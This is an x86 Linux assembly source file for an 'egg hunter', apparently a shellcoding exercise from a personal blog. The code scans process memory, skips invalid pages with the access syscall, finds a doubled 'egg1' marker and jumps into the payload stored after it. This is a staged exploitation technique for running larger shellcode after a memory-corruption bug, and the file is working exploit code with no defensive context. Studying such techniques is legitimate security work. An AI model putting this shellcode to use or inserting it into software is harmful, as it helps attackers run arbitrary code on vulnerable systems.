; Filename: eggHunter2.nasm
; Author: citu_adrian@yahoo.com
; Website: itblog.adrian.citu.name

global _start

section .text
_start:
	xor edx,edx
next_page:
	or dx,0xfff
next_adress:
	inc edx
	lea ebx,[edx+0x4]
	push byte +0x21
	pop eax
	int 0x80
	cmp al,0xf2
	jz next_page 
	mov eax,0x31676765; this is the egg marker: egg1 in hex
	mov edi,edx
	scasd
	jnz next_adress 
	scasd
	jnz next_adress 
	jmp edi
